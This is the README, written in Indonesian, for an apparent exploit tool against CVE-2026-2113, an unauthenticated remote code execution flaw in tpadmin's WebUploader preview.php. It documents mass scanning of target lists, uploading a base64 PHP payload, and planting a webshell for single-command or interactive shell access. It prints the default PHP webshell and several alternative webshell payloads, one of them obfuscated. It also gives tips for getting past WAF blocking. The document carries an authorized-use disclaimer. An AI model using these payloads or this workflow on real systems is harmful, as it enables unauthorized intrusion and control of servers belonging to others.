# CVE-2026-2113 · tpadmin WebUploader Unauth RCE

> Scanner + exploiter untuk **CVE-2026-2113** — kerentanan *unauthenticated Remote Code Execution* pada **yuan1994 tpadmin** (≤ 1.3.12) melalui komponen WebUploader `preview.php`.

![version](https://img.shields.io/badge/version-0.2-blue)
![python](https://img.shields.io/badge/python-3.8%2B-yellow)
![use](https://img.shields.io/badge/use-authorized%20only-red)

Owner : [https://yora1928.my.id/](https://yora1928.my.id/)

---

## Daftar Isi

- [Ringkasan](#ringkasan)
- [Fitur](#fitur)
- [Instalasi](#instalasi)
- [Penggunaan](#penggunaan)
- [Mode Operasi](#mode-operasi)
- [Output](#output)
- [Struktur Kode](#struktur-kode)
- [Alur Kerja](#alur-kerja)
- [Windows Notes](#windows-notes)
- [Troubleshooting](#troubleshooting)
- [Batasan](#batasan)
- [Disclaimer](#disclaimer)
- [Kredit](#kredit)

---

## Ringkasan

**CVE-2026-2113** adalah kerentanan **RCE tanpa autentikasi** pada `yuan1994 tpadmin` versi **1.3.0 – 1.3.12**. Akar masalahnya adalah **deserialisasi data tidak tepercaya** (CWE-502) dan **unrestricted file upload** (CWE-434) pada skrip:

```
/public/static/admin/lib/webuploader/0.1.5/server/preview.php
```

Penyerang dapat mengirim payload PHP tersandi base64 melalui parameter `data` dengan skema `data:` URI, yang kemudian dieksekusi oleh server.

Tool ini mengimplementasikan rantai serangan tersebut dalam satu binary Python dengan alur:

```
preflight → probe → verify → exploit
```

---

## Fitur

| Kategori | Fitur |
|---|---|
| **Scanning** | Mass scan dari `daftar.txt`, paralel (`--threads`), preflight per target |
| **Deteksi** | Probe `preview.php` tanpa follow redirect, fingerprint tpadmin/thinkphp/webuploader |
| **Verifikasi** | Upload payload marker unik → cek refleksi → konfirmasi eksekusi |
| **Exploit** | `--exploit` tanam webshell, `--cmd` eksekusi tunggal, `--shell` interaktif |
| **Payload** | Default webshell `cmd`, atau `--payload` untuk PHP kustom |
| **Output** | JSONL (`hasil.txt`) + human-readable (`hasil_clean.txt`) |
| **UI** | Banner ASCII, progress bar `█░`, simbol status Unicode, ringkasan box |
| **Safety** | Anti-crash (semua exception di-wrap), graceful `Ctrl+C`, preflight wajib sebelum upload |
| **Network** | `--proxy` HTTP, `--timeout` custom, sesi persistent dengan User-Agent browser |

---

## Instalasi

### Prasyarat

- **Python 3.8+**
- Library `requests`

### Instal dependency

```bash
pip install requests
```

Atau kalau `pip` terbatas:

```bash
python -m pip install --user requests
```

### Siapkan folder kerja

Simpan file `cve_2026_2113.py` di folder kerja, lalu buat file `daftar.txt`:

```
# daftar target
192.168.1.10
https://cms.example.com
10.0.0.5:8080
```

---

## Penggunaan

### Help

```bash
python cve_2026_2113.py -h
```

### Cek versi

```bash
python cve_2026_2113.py --version
# → cve_2026_2113 v0.2 · https://yora1928.my.id/
```

### Scan massal

```bash
python cve_2026_2113.py -l daftar.txt --threads 8
```

### Preflight only (tanpa upload)

```bash
python cve_2026_2113.py -l daftar.txt --dry
```

Berguna untuk memverifikasi target reachable **sebelum** upload payload apa pun.

### Single target

```bash
python cve_2026_2113.py -t http://10.0.0.5
```

### Exploit

```bash
# tanam webshell
python cve_2026_2113.py -t http://10.0.0.5 --exploit

# eksekusi perintah tunggal
python cve_2026_2113.py -t http://10.0.0.5 --cmd "id"

# shell interaktif
python cve_2026_2113.py -t http://10.0.0.5 --shell

# payload kustom
python cve_2026_2113.py -t http://10.0.0.5 --exploit --payload "<?php phpinfo(); ?>"
```

### Dengan proxy

```bash
python cve_2026_2113.py -l daftar.txt --proxy http://127.0.0.1:8080
```

### Tanpa warna (untuk redirect ke file)

```bash
python cve_2026_2113.py -l daftar.txt --no-color > log.txt
```

### Ringkasan flag

| Flag | Deskripsi |
|---|---|
| `-t, --target URL` | single target (host atau URL) |
| `-l, --list PATH` | file daftar target (default `daftar.txt`) |
| `-o, --out PATH` | output JSONL (default `hasil.txt`) |
| `--timeout N` | timeout request dalam detik (default 12) |
| `--threads N` | jumlah worker thread (default 5) |
| `--proxy URL` | HTTP proxy (mis. `http://127.0.0.1:8080`) |
| `--dry` | preflight only, tanpa upload |
| `--no-color` | matikan ANSI color |
| `--exploit` | tanam webshell ke target rentan |
| `--cmd "CMD"` | eksekusi perintah tunggal via webshell |
| `--shell` | mode interaktif shell |
| `--payload "PHP"` | kode PHP kustom untuk webshell |
| `--version` | tampilkan versi + owner |

---

## Mode Operasi

### 1. Scan Mode (default)

Untuk setiap target:

1. `preflight()` — cek host hidup + probe `preview.php`
2. `upload_shell()` — kirim payload `<?php echo 'MARKER'; ?>` base64
3. `verify_shell()` — `GET` URL kandidat, cek apakah marker muncul

Status yang mungkin:

| Status | Simbol | Arti |
|---|---|---|
| `VULN` | ✓ | Webshell terverifikasi, URL dicatat |
| `MAYBE` | ? | Upload sukses tapi URL tidak bisa diverifikasi |
| `NO` | × | Target hidup tapi tidak rentan |
| `SKIP` | ∅ | Preflight gagal (host mati / path 404) |
| `OK` | ● | Mode `--dry`: preflight lolos |
| `ERR` | ! | Exception saat scanning |

### 2. Exploit Mode (`--exploit` / `--cmd` / `--shell`)

Hanya untuk **single target** (wajib pakai `-t`). Alur:

1. Preflight
2. Upload webshell dengan marker verifikasi
3. Konfirmasi eksekusi
4. Eksekusi perintah / masuk shell

Webshell default:

```php
<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>
```

Verifikasi menggunakan marker unik `CVE2113_<8hex>` yang tertanam di response agar URL shell yang dikembalikan benar-benar berfungsi (bukan sekadar upload sukses).

---

## Output

Setiap scan menghasilkan **dua file**:

### `hasil.txt` (JSONL)

Satu baris per target, header info tool:

```
# tool    : cve_2026_2113 v0.2
# owner   : https://yora1928.my.id/
# cve     : CVE-2026-2113
# scan    : 2026-10-25 14:30:12
{"target": "http://10.0.0.5", "status": "VULN", "shell": "http://10.0.0.5/uploads/shell.php", "note": "verified"}
{"target": "http://10.0.0.6", "status": "not-vuln", "shell": null, "note": "preview 200 · fp:tpadmin"}
```

Filter dengan `jq`:

```bash
jq -r 'select(.status=="VULN") | "\(.target) -> \(.shell)"' hasil.txt
```

Filter dengan PowerShell:

```powershell
Get-Content hasil.txt | Where-Object { $_ -match '"status":"VULN"' }
```

### `hasil_clean.txt` (human-readable)

Dikelompokkan per status:

```
=== VULNERABLE ===
http://10.0.0.5                               -> http://10.0.0.5/uploads/shell.php
http://10.0.0.6                               -> <inline>

=== MAYBE ===
http://10.0.0.7                               # 3 url(s) · verify failed

=== CLEAN / SKIP ===
http://10.0.0.8                               # not-vuln: preview 200 · fp:tpadmin
http://10.0.0.9                               # skip: unreachable (ConnectionError)
```

---

## Struktur Kode

```
cve_2026_2113.py
├── metadata          __tool__, __version__, __owner__, __cve__
├── windows ansi      SetConsoleMode untuk cmd/PowerShell
├── colors            class C + strip_color()
├── banner()          banner ASCII box
├── config            PATHS[], FP_HINTS[], UA, DEFAULT_WEBSHELL, SYM_*
├── Progress          progress bar thread-safe
├── Target            wrapper session, url normalization
├── preflight()       reachability + fingerprint + path probe
├── build_data_uri()  PHP → base64 data URI
├── extract_urls()    regex URL extraction
├── upload_shell()    POST payload, deteksi inline-exec
├── verify_shell()    konfirmasi eksekusi via marker
├── find_working_shell()  upload + verify pipeline
├── execute_command() GET ?cmd=<cmd>
├── interactive_shell()   loop prompt
├── run_scan()        scan pipeline
├── run_exploit()     exploit pipeline
├── read_list()       baca daftar.txt
├── save_results()    simpan JSONL + clean TXT
├── render_result()   per-target output
├── summary_box()     ringkasan akhir
└── main()            argparse + dispatch
```

---

## Alur Kerja

### Scan pipeline

```
                     ┌──────────────┐
                     │   daftar.txt │
                     └──────┬───────┘
                            │
                    ┌───────▼────────┐
                    │  read_list()   │
                    └───────┬────────┘
                            │
                ┌───────────▼────────────┐
                │   Target(raw, timeout) │  ← paralel (--threads)
                └───────────┬────────────┘
                            │
                ┌───────────▼────────────┐
                │      preflight()       │
                │  GET /  +  GET path ×4 │
                └───────────┬────────────┘
                            │
                 ┌──────────┴──────────┐
                 │                     │
             [gagal]                [lolos]
                 │                     │
              SKIP            ┌────────▼────────┐
                              │  --dry ?        │
                              └────────┬────────┘
                                       │
                            ┌──────────┴──────────┐
                           ya                    tidak
                            │                     │
                          OK ✓         ┌──────────▼──────────┐
                                       │  upload_shell()     │
                                       │  data:image/php;b64 │
                                       └──────────┬──────────┘
                                                  │
                                       ┌──────────▼──────────┐
                                       │  extract_urls()     │
                                       │  + verify_shell()   │
                                       └──────────┬──────────┘
                                                  │
                                    ┌─────────────┴─────────────┐
                                    │                           │
                                 [VULN]                     [MAYBE]
                                    │                           │
                          ┌─────────▼─────────┐                 │
                          │ save_results()    │◄────────────────┘
                          │ hasil.txt         │
                          │ hasil_clean.txt   │
                          └───────────────────┘
```

### Exploit pipeline (single target)

```
preflight() → upload_shell(test_code) → verify_shell(marker)
     │                    │                       │
     └─ gagal → exit      └─ tanpa URL → exit    └─ gagal → exit
                                                  │
                                        shell_url tersimpan
                                                  │
                            ┌─────────────────────┼─────────────────────┐
                            │                     │                     │
                        --exploit              --cmd "id"            --shell
                            │                     │                     │
                    tampilkan URL         execute_command()     interactive_shell()
```

---

## Windows Notes

### Jalankan dengan `python` (bukan `/usr/bin/env`)

Shebang `#!/usr/bin/env python3` hanya berlaku di Linux/macOS. Di Windows:

```powershell
cd C:\path\to\tool
python .\cve_2026_2113.py -h
```

Kalau `python` tidak dikenali, coba `py`:

```powershell
py .\cve_2026_2113.py -h
```

### ANSI otomatis diaktifkan

Script memanggil `SetConsoleMode` via `ctypes` di Windows sehingga ANSI escape berfungsi di cmd/PowerShell tanpa perlu `colorama`.

### Kalau warna tetap rusak

```powershell
python .\cve_2026_2113.py -l daftar.txt --no-color
```

### Unicode error

```powershell
chcp 65001
$env:PYTHONUTF8 = "1"
python .\cve_2026_2113.py -l daftar.txt
```

---

## Troubleshooting

| Error | Penyebab | Solusi |
|---|---|---|
| `ModuleNotFoundError: requests` | belum install | `pip install requests` |
| `'python' is not recognized` | Python tidak di PATH | pakai `py` |
| `←[31m` muncul di output | ANSI tidak aktif | auto-handled; atau `--no-color` |
| `ConnectionError` / `Timeout` | target tidak responsif | naikkan `--timeout 20` |
| `file not found: daftar.txt` | file tidak ada | buat file atau pakai `-t` |
| `all targets invalid` | format URL salah | pastikan tiap baris valid host/URL |
| `exploit gagal: preview blocked` | `preview.php` tidak reachable | cek manual di browser / `--dry` |
| `403 Forbidden` di preflight | WAF / firewall | pakai `--proxy`, kurangi `--threads`, tambah delay manual |
| `inline-exec` tapi output kosong | webshell tidak terpanggil | coba `--payload` dengan `phpinfo()` untuk verifikasi |

---

## Batasan

- Tool ini **hanya menguji keberadaan dan menanam webshell generik**. Tidak ada fitur bypass `disable_functions`, WAF evasi, atau persistence.
- Kalau `preview.php` menyimpan file di direktori acak dan tidak mengembalikan URL, status akan `MAYBE` — ini keterbatasan informasi dari respons server, bukan bug.
- Webshell default memakai `system()` yang bisa diblokir kalau `disable_functions` aktif. Gunakan `--payload` untuk alternatif seperti:
  - `<?php echo shell_exec($_REQUEST['cmd']); ?>`
  - `<?php passthru($_REQUEST['cmd']); ?>`
  - `<?php $f=base64_decode('...'); $f($_REQUEST['cmd']); ?>`

---

## Disclaimer

> **Tool ini disediakan untuk tujuan pendidikan dan pengujian keamanan yang sah saja.**
>
> - Gunakan **hanya** pada sistem yang Anda miliki atau memiliki **izin tertulis** untuk diuji.
> - Penyalahgunaan terhadap sistem tanpa izin adalah **tindak pidana** di hampir semua yurisdiksi.
> - Penulis dan owner **tidak bertanggung jawab** atas penyalahgunaan atau kerusakan yang timbul.
>
> Baca dan patuhi undang-undang yang berlaku di wilayah Anda (UU ITE di Indonesia, CFAA di AS, Computer Misuse Act di UK, dll).

---

## Kredit

| | |
|---|---|
| **CVE** | [CVE-2026-2113](https://nvd.nist.gov/vuln/detail/CVE-2026-2113) |
| **Produk** | yuan1994 tpadmin ≤ 1.3.12 |
| **Endpoint** | `/public/static/admin/lib/webuploader/0.1.5/server/preview.php` |
| **Tool** | cve_2026_2113 v0.2 |
| **Owner** | [https://yora1928.my.id/](https://yora1928.my.id/) |

---

<div align="center">

**cve_2026_2113 v0.2** · built for authorized security testing
<br>
[owner](https://yora1928.my.id/)

</div>
